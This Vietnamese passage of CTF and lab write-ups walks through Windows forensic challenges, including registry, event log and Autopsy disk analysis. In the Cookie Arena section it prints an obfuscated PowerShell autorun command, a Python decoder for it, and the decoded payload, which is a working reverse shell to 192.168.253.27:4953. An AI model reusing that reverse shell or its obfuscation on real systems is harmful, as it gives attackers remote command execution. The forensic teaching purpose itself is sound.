- Vào địa chỉ `NTUSER.DAT\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\` của user `THM-4n6`, ta thấy có các mục sau:
![image](https://hackmd.io/_uploads/BJIplX5Rgx.png)
- Vào mục `.txt`, ta thấy `Target Name` là `Changelog.txt`. Tại phần `Opened On`:
![image](https://hackmd.io/_uploads/rkuV-790eg.png)
**$\rightarrow$ Đáp án cần điền là `2021-11-24 18:18:48`.**

##### e) What is the complete path from where the python 3.8.2 installer was run?
- Vào địa chỉ `NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\` và dò từng `GUID`, ta thấy rằng tại hai `GUIDE` áp cuối thì phần `Count` có giá trị, còn mấy `Count` khác không có gì:
![image](https://hackmd.io/_uploads/r1l_X79Cxe.png)
- Dò `Count (59)`, tại `Program Name` ta tìm được:
![image](https://hackmd.io/_uploads/rklamXq0ee.png)

**$\rightarrow$ Đáp án cần điền là `Z:\setups\python-3.8.2.exe`.**

##### f) When was the USB device with the friendly name `USB` last connected?
- Để theo vết USB kết nối tới hệ thống khi nào, ta vào địa chỉ `SYSTEM\ControlSet001\Enum\USBSTOR\`, ta thấy có hai `Ven_Prod_Version` sau:
![image](https://hackmd.io/_uploads/SybZHQqRlx.png)
- Dò trong hai mục trên, vào phần `USBSerial#\Properties\{83da6326-97a6-4088-9453-a19231573b29}\0066` (với `0066` là giá trị chỉ thời gian kết nối lần cuối của USB), ta được hai dữ liệu của hai USB là:
![image](https://hackmd.io/_uploads/HyE2B7qRgg.png)
![image](https://hackmd.io/_uploads/S171U7cCxl.png)
- Nhập lần lượt hai thời gian trên để check đáp án, ta thấy rằng USB đầu tiên là USB cần tìm.
**$\rightarrow$ Đáp án cần điền là `2021-11-24 18:40:06`.**

### II. Task 6 - Windows Fundamentals 1:
- *[Link bài lab](https://tryhackme.com/room/windowsfundamentals1xbx) (Mở ở Task 3).*
- Vào Start Menu, gõ `Run`. Từ hộp thoại Run gõ `lusrmgr.msc`.
#### 1. What is the name of the other user account?
![image](https://hackmd.io/_uploads/rJY3sONl-x.png)
**$\rightarrow$ Đáp án cần điền là `tryhackmebilly`.**

#### 2. What groups is this user a member of?
![image](https://hackmd.io/_uploads/B1jg3_VeWe.png)
**$\rightarrow$ Đáp án cần điền là `Remote Desktop Users,Users`.**

#### 3. What built-in account is for guest access to the computer?
![image](https://hackmd.io/_uploads/r1ZN2uNg-g.png)
**$\rightarrow$ Đáp án cần điền là `Guest`.**

#### 4. What is the account description?
![image](https://hackmd.io/_uploads/Sy3hsdEx-l.png)
**$\rightarrow$ Đáp án cần điền là `window$Fun1!`.**

### III. Windows Fundamentals 2:
#### Task 2
- [Link bài lab](https://tryhackme.com/room/windowsfundamentals2x0x)
- Mở System Configuration trong Start Menu.

##### 1. What is the name of the service that lists Systems Internals as the manufacturer?
Tại tab `Service`, tìm `Systems Internals` trong phần `Manufacturer`:
![image](https://hackmd.io/_uploads/SkXSXLwg-x.png)
**$\rightarrow$ Đáp án cần điền là `PsShutdown`.**

##### 2. Whom is the Windows license registered to?
Tại `About Windows` ở tab `Tools`, chọn `Launch:`
![image](https://hackmd.io/_uploads/B1TDEUPe-l.png)
**$\rightarrow$ Đáp án cần điền là `Windows User`.**

##### 3. What is the command for Windows Troubleshooting?
Tại `Windows Troubleshooting` ở tab `Tools`:
![image](https://hackmd.io/_uploads/B1rANLPe-e.png)
**$\rightarrow$ Đáp án cần điền là `C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`.**

##### 4. What command will open the Control Panel? (The answer is  the name of .exe, not the full path)
Tại `System Properties` ở tab `Tools`:
![image](https://hackmd.io/_uploads/BkqVr8Dl-e.png)
**$\rightarrow$ Đáp án cần điền là `control.exe`.**

#### Task 3:
- What is the command to open User Account Control Settings? (The answer is the name of the .exe file, not the full path)
    - Mở System Configuration trong Start Menu. Tại `Change UAC Settings` ở tab `Tools`:
    ![image](https://hackmd.io/_uploads/HJFtuIweZx.png)
    **$\rightarrow$ Đáp án cần điền là `UserAccountControlSettings.exe`.**
    
#### Task 4:
##### 1. What is the command to open Computer Management? (The answer is the name of the .msc file, not the full path)
Mở System Configuration trong Start Menu. Tại `Computer Management` ở tab `Tools`:
![image](https://hackmd.io/_uploads/Bytmuvwebx.png)
**$\rightarrow$ Đáp án cần điền là `compmgmt.msc`.**

##### 2. At what time every day is the GoogleUpdateTaskMachineUA task configured to run?
- Mở Start Menu, tìm `Computer Management`, ở phần `Task Scheduler Library` trong `Task Scheduler`:
![image](https://hackmd.io/_uploads/ryz0umOxZe.png)
- Không thấy gì cả :) Nên bài này ta tham khảo write - up trên mạng:
![image](https://hackmd.io/_uploads/ryP-K7Ox-e.png)
**$\rightarrow$ Đáp án cần điền là `6:15 AM`.**

##### 3. What is the name of the hidden folder that is shared?
Mở Start Menu, tìm `Computer Management`, ở phần `Shares` trong `Shared Folders`, ngoài các Share Names mặc định là `ADMIN$`, `C$`, `IPC$`:
![image](https://hackmd.io/_uploads/rk4gRzuxZl.png)
**$\rightarrow$ Đáp án cần điền là `sh4r3dF0Ld3r`.**

#### Task 5:
##### 1. What is the command to open System Information? (The answer is the name of the .exe file, not the full path)
Mở System Configuration trong Start Menu. Tại `System Information` ở tab `Tools`:
![image](https://hackmd.io/_uploads/SksNO2Fx-l.png)
**$\rightarrow$ Đáp án cần điền là `msinfo32.exe`.**

##### 2. What is listed under System Name?
Mở System Information trong Start Menu. Tại phần `System Name` của `System Summary`:
![image](https://hackmd.io/_uploads/BylyK2tlWl.png)
**$\rightarrow$ Đáp án cần điền là `THM-WINFUN2`.**

##### 3. Under Environment Variables, what is the value for ComSpec?
Mở System Information trong Start Menu. Tại `Environment Variables` trong `Software Environment`, ở phần `ComSpec`:
![image](https://hackmd.io/_uploads/BJ3mj3Flbg.png)
**$\rightarrow$ Đáp án cần điền là `%SystemRoot%\system32\cmd.exe`.**

#### Task 6:
What is the command to open Resource Monitor? (The answer is the name of the .exe file, not the full path)
- Mở System Configuration trong Start Menu. Tại `Resource Monitor` ở tab `Tools`:
![image](https://hackmd.io/_uploads/H1hEgpYlbe.png)
**$\rightarrow$ Đáp án cần điền là `resmon.exe`.**

#### Task 7:
##### 1. In System Configuration, what is the full command for Internet Protocol Configuration?
Mở System Configuration trong Start Menu. Tại `Internet Protocol Configuration` ở tab `Tools`:
![image](https://hackmd.io/_uploads/rkDiSTKeWl.png)
**$\rightarrow$ Đáp án cần điền là `C:\Windows\System32\cmd.exe /k %windir%\system32\ipconfig.exe`.**

##### 2. For the ipconfig command, how do you show detailed information?
Link tham khảo: [An A-Z Index of Windows CMD commands](https://ss64.com/nt/)
![image](https://hackmd.io/_uploads/HJbmUpYlbl.png)
**$\rightarrow$ Đáp án cần điền là `ipconfig /all`.**

#### Task 8:
What is the command to open the Registry Editor? (The answer is the name of  the .exe file, not the full path)
- Mở System Configuration trong Start Menu. Tại `Resource Monitor` ở tab `Tools`:
![image](https://hackmd.io/_uploads/HkuNw1ce-x.png)
**$\rightarrow$ Đáp án cần điền là `regedt32.exe`.**

### IV. Investigating Windows:
[Link bài lab](https://tryhackme.com/room/investigatingwindows)

#### 1. Whats the version and year of the Windows machine?
Vào File Explorer, chuột phải vào `This PC` và chọn `Properties`:
![image](https://hackmd.io/_uploads/B1AJhNieWg.png)
![image](https://hackmd.io/_uploads/SyqGhNjlWg.png)
**$\rightarrow$ Đáp án cần điền là `Windows Server 2016`.**

#### 2. Which user logged in last?
- Từ Start Menu, mở Event Viewer, sau đó vào `Security` của `Windows Logs`:
![image](https://hackmd.io/_uploads/S17ACVil-g.png)
- Ở phía bên phải, chọn `Filter Current Log...` và nhập event ID `4624` (Một tài khoản đã đăng nhập thành công) để lọc các account đã đăng nhập vào máy:
![image](https://hackmd.io/_uploads/By9neBilZx.png)
- Dò dần dần từ trên xuống dưới, ta thấy `Administator`:
![image](https://hackmd.io/_uploads/SkgT-BoxWg.png)

**$\rightarrow$ Đáp án cần điền là `Administrator`.**

#### 3. When did John log onto the system last? 
> *Answer format: MM/DD/YYYY H:MM:SS AM/PM*

Dùng `Find...` và tìm từ khoá `John`:
![image](https://hackmd.io/_uploads/rklsGSjgWg.png)
**$\rightarrow$ Đáp án cần điền là `03/02/2019 5:48:32 PM`.**

#### 4. What IP does the system connect to when it first starts?
Từ Start Menu, mở System Information. Ở phần `Software Environment`, mở `Startup Programs`:
![image](https://hackmd.io/_uploads/Skd9mHigbl.png)
**$\rightarrow$ Đáp án cần điền là `10.34.2.3`.**

#### 5. What two accounts had administrative privileges (other than the Administrator user)?
> *Answer format: List them in alphabetical order*

- Mở User Accounts trong Start Menu:
![image](https://hackmd.io/_uploads/SyRrEHsx-e.png)
- Mở `Manage another account`:
![image](https://hackmd.io/_uploads/SJhdErogWx.png)
Ta chỉ thấy `Administrator` và `Jenny` là có quyền admin, vẫn còn thiếu một account.
- Gõ `lusrmgr.msc` trong hộp thoại Run (`Windows`+`R`). Vào `Groups`>`Administrators` rồi chuột phải:
![image](https://hackmd.io/_uploads/S1EVOSjxbx.png)
- Chọn `Properties`:
![image](https://hackmd.io/_uploads/ryI8drigZx.png)

**$\rightarrow$ Đáp án cần điền là `Guest, Jenny`.**

#### 6. What's the name of the scheduled task that is malicous?
Từ Start Menu vào Computer Management. Tại phần `Task Scheduler Library` trong `Task Scheduler`:
![image](https://hackmd.io/_uploads/B1352Hsl-g.png)
Phần `Description` của `Clean file system` trông hơi lạ lạ lỏ lỏ vì các tasks (của admin) khác hầu như không có ghi gì trong mô tả, trừ `npcapwatchdog` có ghi `Ensure Npcap service is configured to start at boot`.
**$\rightarrow$ Đáp án cần điền là `Clean file system`.**

#### 7. What file was the task trying to run daily?
Vào phần `Actions`:
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `nc.ps1`.**

#### 8. What port did this file listen locally for?
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `1348`.**

#### 9. When did Jenny last logon?
- Từ Start Menu, mở Event Viewer, sau đó vào `Security` của `Windows Logs`:
![image](https://hackmd.io/_uploads/S17ACVil-g.png)
- Ở phía bên phải, chọn `Filter Current Log...` và nhập event ID `4624` (Một tài khoản đã đăng nhập thành công) để lọc các account đã đăng nhập vào máy:
![image](https://hackmd.io/_uploads/By9neBilZx.png)
- Chọn `Find...` và gõ từ khoá `Jenny`:
![image](https://hackmd.io/_uploads/Bk8LZIieWx.png)
- Vào Commant Prompt với quyền admin, gõ `net user Jenny` để xem chi tiết về account này:
![image](https://hackmd.io/_uploads/BJsNGLoebe.png)

**$\rightarrow$ Đáp án cần điền là `Never`.**

#### 10. At what date did the compromise take place?
> *Answer format: MM/DD/YYYY*

- Trong `Computer Managerment`>`Task Scheduler`>`Task Scheduler Library`>`Clean file system`>`Actions`, có thể thấy địa chỉ chứa file `nc.ps1` là `C:\TMP\`:
![image](https://hackmd.io/_uploads/S1rrRrsxWx.png)
**$\rightarrow$ Đáp án cần điền là `03/02/2019`.**
- Vào `C:\TMP\` trong File Explorer, có thể thấy tất cả đều được tạo cùng một ngày:
![image](https://hackmd.io/_uploads/ByPGYLixWe.png)

**$\rightarrow$ Đáp án cần điền là `03/02/2019`.**

#### 11. During the compromise, at what time did Windows first assign special privileges to a new logon?
> *Answer format: MM/DD/YYYY HH:MM:SS AM/PM*
> Hint:
> ![image](https://hackmd.io/_uploads/SJY7Jwslbe.png)

- Tìm event ID:
![image](https://hackmd.io/_uploads/SJ6bjIog-l.png)
- Lọc những event có ID `4672` trong thời gian `03/02/2019`:
![image](https://hackmd.io/_uploads/BywdnLol-g.png)
- Tìm event có thời gian giống hint, từ dưới lên trên:
![image](https://hackmd.io/_uploads/Syb8ePjxbx.png)

**$\rightarrow$ Đáp án cần điền là `03/02/2019 4:04:49 PM`.**

#### 12. What tool was used to get Windows passwords?
- Vào `C:\TMP\` dò thử các file `.txt`, ở `mim-out`:
![image](https://hackmd.io/_uploads/SJfREL2xWl.png)
- Theo Wikipedia:
![image](https://hackmd.io/_uploads/rJNzSIhl-l.png)
> Ngoài ra có thể kiểm tra bằng cách:
> - Dùng lệnh `get-filehash .\mim.exe | Format-List` trong PowerShell (Administrator) để lấy mã hash:
> ![image](https://hackmd.io/_uploads/HyuoOIngWe.png)
> - Đưa hash đó lên [VIRUSTOTAL](https://www.virustotal.com/gui/home/upload):
> ![image](https://hackmd.io/_uploads/SJLDFL3eZe.png)

**$\rightarrow$ Đáp án cần điền là `Mimikatz`.**

#### 13. What was the attackers external control and command servers IP?
- File `hosts` là file máy tính được sử dụng trong hệ điều hành để ánh xạ tên máy chủ với địa chỉ IP, nằm ở `C:\Windows\System32\drivers\etc`.
- Truy cập tới `hosts` và chọn Notepad để mở:
![image](https://hackmd.io/_uploads/B1Js5L3xZx.png)
- Nội dung file:
![image](https://hackmd.io/_uploads/HkNXoUhx-e.png)
Có thể thấy rằng localhost IP là `127.0.0.1`, và IP lạ là `76.32.97.132`.

**$\rightarrow$ Đáp án cần điền là `76.32.97.132`.**

#### 14. What was the extension name of the shell uploaded via the servers website?
- Thư mục `C:\inetpub` thường được liên kết với IIS (Dịch vụ thông tin Internet) máy chủ web của Microsoft cho phép lưu trữ các trang web và dịch vụ trực tuyến trên máy tính Windows. Thông thường nếu đã cài đặt IIS, thư mục này lưu trữ các tập tin cho trang web, các records và các files cần thiết cho hoạt động của dịch vụ.
- Truy cập `C:\inetpub`, ta thấy thư mục `wwwroot`, tiếp tục truy cập nó:
![image](https://hackmd.io/_uploads/HylZ26LhxWe.png)
Có hai file có định dạng `JSP` và một `GIF`.
- Theo Wikipedia:
![image](https://hackmd.io/_uploads/HkYx083lbx.png)
![image](https://hackmd.io/_uploads/BJuPRI3xbg.png)
- File `GIF` là file ảnh, dùng PowerShell kiểm tra nội dung của hai file `JSP` bằng PowerShell:
![image](https://hackmd.io/_uploads/SymayD2xZg.png)
File `b.jsp` nội dung rất dài nhưng hai file đều chứa code. Đây có thể là extension file cần tìm.

**$\rightarrow$ Đáp án cần điền là `.jsp`.**

#### 15. What was the last port the attacker opened?
- Xem ports đang mở bằng cách check Windows logs. Từ Start Menu mở Windows Firewall with Advanced Securuty và mở `Inbound Rules`:
![image](https://hackmd.io/_uploads/HJyyMvnlbl.png)
- Rule đầu tiên là `Allow outside connection for development`, nó đáng ngờ vì IP lạ ping tới Google. Chuột phải chọn `Properties`, ở `Protocols and Ports`:
![image](https://hackmd.io/_uploads/SkktMwnebl.png)

**$\rightarrow$ Đáp án cần điền là `1337`.**

#### 16. Check for DNS poisoning, what site was targeted?
Vì có IP lạ ping đến Google nên website này sẽ là đối tượng tình nghi.
![image](https://hackmd.io/_uploads/BJ6UQv2g-l.png)
**$\rightarrow$ Đáp án cần điền là `google.com`.**

### V. Disk Analysis & Autopsy
- [Link bài lab](https://tryhackme.com/room/autopsy2ze0)
> *In the attached VM, there is an Autopsy case file and its corresponding disk image. After loading the .aut file, make sure to re-point Autopsy to the disk image file.*
> ![image](https://hackmd.io/_uploads/rk5Xnqae-x.png)
- Mở Autopsy với quyền Administrator trên máy ảo:
![image](https://hackmd.io/_uploads/SyYjeopeZl.png)
- Chọn `Open Case`, rồi đi đến `Case Files` rồi chọn `Tryhackme.aut` và `Open`:
![image](https://hackmd.io/_uploads/S1tWZspxZl.png)
- `Search for missing image` theo chỉ dẫn của lab.

#### 1. What is the MD5 hash of the E01 image?
Sau khi `Search for missing image` và `Open`, bấm vào `HASAN2.E01` rồi chọn `File Metadata` ở dưới:
![image](https://hackmd.io/_uploads/HkAEMipxWl.png)
**$\rightarrow$ Đáp án cần điền là `3f08c518adb3b5c1359849657a9b2079`.**

#### 2. What is the computer account name?
Chọn `Operating System Information` ở phía bên trái:
![image](https://hackmd.io/_uploads/H16XXopeZx.png)
**$\rightarrow$ Đáp án cần điền là `DESKTOP-0R59DJ3`.**

#### 3. List all the user accounts.
> *Alphabetical order*

Chọn `Operating System User Account` ở phía bên trái, trừ các account mặc định (`Administrator`, `Guest`, `DefaultAccount`, `WDAGUtibilityAccount`, `systemprofile`, `LocalService`, `NetworkService`):
![image](https://hackmd.io/_uploads/r1kvNsTgZx.png)
**$\rightarrow$ Đáp án cần điền là `H4S4N,joshwa,keshav,sandhya,shreya,sivapriya,srini,suba`.**

#### 4. Who was the last user to log into the computer?
Ở cột `Data Accesed`, tìm thời gian truy cập mới nhất:
![image](https://hackmd.io/_uploads/r1kvNsTgZx.png)
**$\rightarrow$ Đáp án cần điền là `sivapriya`.**

#### 5. What was the IP address of the computer?
> *The investigator uses Autopsy to locate the IP address and MAC address of the system by analyzing program files and searching for network-related information. These details are found in log files related to the LAN network.*
- Ở bên trái vào `Data Source`, lần theo địa chỉ `img_HASAN2.E01/vol_vol3/Program Files (x86)/Look@LAN/`:
![image](https://hackmd.io/_uploads/HJI-dipebl.png)
- Ở file `irunin.ini`, tại thẻ `Text` có thông số `%LANIP=192.168.130.216`:
![image](https://hackmd.io/_uploads/SyyhdsTxbx.png)
**$\rightarrow$ Đáp án cần điền là `192.168.130.216`.**

#### 6. What was the MAC address of the computer?
> - *Answer format: XX-XX-XX-XX-XX-XX*
> - *Hint:*
> ![image](https://hackmd.io/_uploads/HJ0pKj6xZg.png)

Ở file `irunin.ini`, tại thẻ `Text` có thông số `%LANNIC=0800272cc4b9`:
![image](https://hackmd.io/_uploads/SyyhdsTxbx.png)
**$\rightarrow$ Đáp án cần điền là `08-00-27-2c-c4-b9`.**

#### 7. What is the name of the network card on this computer?
> *The analysis proceeds to identify the network cards on the system by exploring the software registry entries. Information about installed network adapters is retrieved from the registry, including their service names and descriptions.*

- Chọn `Operating System Information` ở phía bên trái:
![image](https://hackmd.io/_uploads/H16XXopeZx.png)
- Nháy đúp chuột vào `SOFTWARE` để đi đến file `ROOT` của nó. Ở thẻ `Application`, lần theo `ROOT/Microsoft/Windows NT/CurrentVersion/NetworkCards/2/` và xem phần `Description`:
![image](https://hackmd.io/_uploads/Hyn5y3TeZe.png)

**$\rightarrow$ Đáp án cần điền là `Intel(R) PRO/1000 MT Desktop Adapter`.**

#### 8. What is the name of the network monitoring tool?
- Vào phần `Installed Program` phía bên trái, chú ý thấy có phần mềm:
![image](https://hackmd.io/_uploads/SJ1Pgnag-e.png)
- Search Google:
![image](https://hackmd.io/_uploads/rk6FehTlbg.png)

**$\rightarrow$ Đáp án cần điền là `Look@LAN`.**

#### 9. A user bookmarked a Google Maps location. What are the coordinates of the location?
Ở phần `Web Bookmarks`, tìm URL có liên quan tới Google Maps:
![image](https://hackmd.io/_uploads/rklVW36g-x.png)
**$\rightarrow$ Đáp án cần điền là `12°52'23.0"N 80°13'25.0"E`.**

#### 10. A user has his full name printed on his desktop wallpaper. What is the user's full name?
- Vào phần `Images/Videos` phía trên thanh công cụ và mò từng user trong `/img_HASAN2.E01/vol_vol3/Users/`:
![image](https://hackmd.io/_uploads/HkSnS3Te-g.png)
- Ở phần ảnh của `joshwa` có dòng chữ ở phía góc trái trên nên ta chuột phải và chọn `Show content viewer` rồi chỉnh kích thước lên `150%`:
![image](https://hackmd.io/_uploads/HkaMw3axWx.png)

**$\rightarrow$ Đáp án cần điền là `Anto Joshwa`.**

#### 11. A user had a file on her desktop. It had a flag but she changed the flag using PowerShell. What was the first flag?
Dò từng `ConsoleHost_history.txt` của từng user trong `/img_HASAN2.E01/vol_vol3/Users/[username]/AppData/RoamingMicrosoft/Windows/PowerShell/PSReadLine/`, ở phần của `shreya`:
![image](https://hackmd.io/_uploads/BykgFhagZx.png)
**$\rightarrow$ Đáp án cần điền là `flag{HarleyQuinnForQueen}`.**

#### 12. The same user found an exploit to escalate privileges on the computer. What was the message to the device owner?
Trong `/img_HASAN2.E01/vol_vol3/Users/shreya/` có file `exploit.ps1`:
![image](https://hackmd.io/_uploads/HkMqSeJbbx.png)
**$\rightarrow$ Đáp án cần điền là `Flag{I-hacked-you}`.**

#### 13. Two hack tools focused on passwords were found in the system. What are the names of these tools?
> - *Alphabetical order*
> - *Hint:*
> ![image](https://hackmd.io/_uploads/S1htOg1--g.png)

- Trong `img_HASAN2.E01/vol_vol3/ProgramData/Microsoft/Windows Defender/Scans/History/Service/DetectionHistory` có rất nhiều folders:
![image](https://hackmd.io/_uploads/BJguDeJbWl.png)
- Dò từng folder, ở `02`:
![image](https://hackmd.io/_uploads/BydgugkbWx.png)
![image](https://hackmd.io/_uploads/ryVGOxyWZl.png)
![image](https://hackmd.io/_uploads/HJ_7_xyZWx.png)
**$\rightarrow$ Đáp án cần điền là `Lazagne,Mimikatz`.**

#### 14. There is a YARA file on the computer. Inspect the file. What is the name of the author?
- Tìm trong `/img_HASAN2.E01/vol_vol3/Users/[username]/Downloads/`, của user `H4S4N` có `mimikatz_trunk.zip`. Check file `.zip` có file `.yar`:
![image](https://hackmd.io/_uploads/BkEVqgkWWx.png)
- Check file `.yar`:
![image](https://hackmd.io/_uploads/H1qpclJ-We.png)
**$\rightarrow$ Đáp án cần điền là `Benjamin DELPY (gentilkiwi)`.**

#### 15. One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found?
> *Include the spaces in your answer*

- MS-NRPC (Microsoft Netlogon Remote Protocol) là giao thức Microsoft dùng cho Domain Controller. Nó được dùng để:
    - Xác thực máy tính domain (machine authentication).
    - Thiết lập secure channel giữa workstation $\leftrightarrow$ domain controller.
    - Kiểm soát tài khoản máy tính.
    - Được sử dụng nhiều trong quá trình logon và replication
$\rightarrow$ Đây là giao thức liên quan trực tiếp đến lỗ hổng nổi tiếng Zerologon (CVE-2020-1472) – một exploit dùng MS-NRPC để lấy quyền Domain Admin chỉ bằng vài gói tin đặc biệt.
- User trong challenge đã lưu một file liên quan đến MS-NRPC.
- Dò trong từng `/img_HASAN2.E01/vol_vol3/Users/[username]/AppData/RoamingMicrosoft/Windows/Recent`:
![image](https://hackmd.io/_uploads/H1eNxbJWZe.png)
**$\rightarrow$ Đáp án cần điền là `2.2.0 20200918 Zerologon encrypted.zip`.**

## C. Cookie Arena:
### I. Sổ đăng ký:
> [Link bài lab](https://battle.cookiearena.org/challenges/digital-forensics/so-dang-ky)
> - *Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.*
> - [Link challenge](https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link), password: `cookiehanhoan`
> - Format Flag: `CHH{XXX}`

- Challenge cho một file `NTUSER.DAT` nên ta sẽ dùng tool Registry Explorer của Eric Zimmerman để phân tích.
- Khi khởi động máy tính có hiện tượng lạ, nghĩa là có gì đó tự khởi chạy nên ta sẽ kiểm tra `Software\Microsoft\Windows\CurrentVersion\Run`:
![image](https://hackmd.io/_uploads/ryB3yql-bx.png)
    - **Value name** là `Updater` trông giả giả, ngoài ra **Value** rất dài:
    ```
    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon"
    ```
    - Đưa **Value** trên lên Gemini Pro và nhờ nó giải thích ý nghĩa:
        - `[cONVeRT]::FROmBAse64stRINg(...)`: Giải mã một chuỗi Base64 (chuỗi ký tự lộn xộn dài nhất trong ảnh).
        - `IO.COmpREssion.dEfIATEsTReAm(..., [SYSTEM.iO.ComPReSSion.ComPreSSIonmODe]::DeCOmpress)`: Giải nén dữ liệu vừa giải mã bằng thuật toán Deflate.
        - `reADToEND()|inVOke-exPREssion`: Đọc kết quả cuối cùng và thực thi (đây chính là hành vi của mã độc).
> Thông tin về Fileless Malware (Mã độc không tập tin) trong challenge:
> - Hành vi: Không tạo ra file `.exe` hay `.dll` độc hại trên ổ cứng (giúp qua mặt phần mềm quét virus) mà giấu toàn bộ mã nguồn độc hại vào Registry của Windows và chạy trực tiếp trên RAM qua PowerShell.
> - Quy trình hoạt động:
>    - Windows đọc key `Software\Microsoft\Windows\CurrentVersion\Run` và thấy giá trị `Updater`, Windows nghĩ đây là chương trình cập nhật hệ thống nên cho phép nó chạy.
>    - Command gọi `powershell.exe -windowstyle hidden`, để ẩn cửa sổ đen, để user không biết nó đang chạy.
>    - Lấy chuỗi Base64 bắt đầu bằng `TVFva...`.
>    - `[cONVeRT]::FROmBAse64stRINg`: Chuyển chuỗi này về dạng byte.
>    - `IO.COmpREssion.dEfIATEsTReAm`: Giải nén dữ liệu này, trong challenge attacker đã nén code lại để tiết kiệm chỗ và làm khó việc đọc hiểu).
>    - `inVOke-exPREssion`: Viết tắt là IEX, là lệnh nguy hiểm nhất. Nó lấy kết quả vừa giải nén (đoạn code PowerShell) và chạy nó.
- Tách chuỗi Base64 ra và giải mã nó:
```py
import base64
import zlib

b64_string = "TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8="

# 1. Giải mã Base64
compressed_data = base64.b64decode(b64_string)
    
# 2. Giải nén (Deflate)
# wbits=-zlib.MAX_WBITS để xử lý Raw Deflate (không có header) thường dùng trong PowerShell
decoded_script = zlib.decompress(compressed_data, -zlib.MAX_WBITS)
print(decoded_script.decode('utf-8'))
```
Output:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**$\rightarrow$ Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`**

### II. 

## D. CyberDefenders:
### I. HireMe Lab:
> - [Link bài lab](https://cyberdefenders.org/blueteam-ctf-challenges/hireme/)
> - Đề cho file `.zip` chứa `.ad1` và `.txt` của nó nên ta dùng FTK Imager để phân tích. Vào `File`>`Add Evidence Item...`>`Image File`>`Next >`>`Browser`, chọn `.ad1` và `Finish`.

#### 1. What is the administrator's username?
Ở `User`:
![image](https://hackmd.io/_uploads/rJwxrYNb-g.png)
**$\rightarrow$ Đáp án cần điền là `Karen`.**

#### 2. What is the OS's build number?
- Vào `Windows\System32\config` và export `SOFTWARE`:
![image](https://hackmd.io/_uploads/BJ_odKEbbl.png)
- Dùng tool Registry Explorer để xem hive vừa export, ở phần `CurrentBuild` hay `CurrentBuildNumber` trong `Microsoft\Windows NT\CurrentVersion`:
![image](https://hackmd.io/_uploads/Sy5NttEW-e.png)
**$\rightarrow$ Đáp án cần điền là `16299`.**

#### 3. What is the hostname of the computer?
Tiếp tục export `SYSTEM` và xem nó. Ở phần `ControlSet001\Control\ComputerName\ComputerName`:
![image](https://hackmd.io/_uploads/By4ToYEZWg.png)
**$\rightarrow$ Đáp án cần điền là `TOTALLYNOTAHACK`.**

#### 4. A messaging application was used to communicate with a fellow Alpaca enthusiest. What is the name of the software?
- Vào phần `Microsoft\Windows\CurrentVersion\App Management\System Program` để xem các app, ta thấy `cchat.exe` có vẻ khả nghi:
![image](https://hackmd.io/_uploads/BJ93kq4ZZl.png)
Nhưng nó không đúng .-.
- Vào phần `Microsoft\Windows\CurrentVersion\App Paths` để xem các app đã install:
![image](https://hackmd.io/_uploads/HJLNlqEZbx.png)
- Tra thử tên các app trên Google, đến `Lync`:
![image](https://hackmd.io/_uploads/SJnDlc4--l.png)
**$\rightarrow$ Đáp án cần điền là `Skype`.**

#### 5. What is the zip code of the administrator's post?
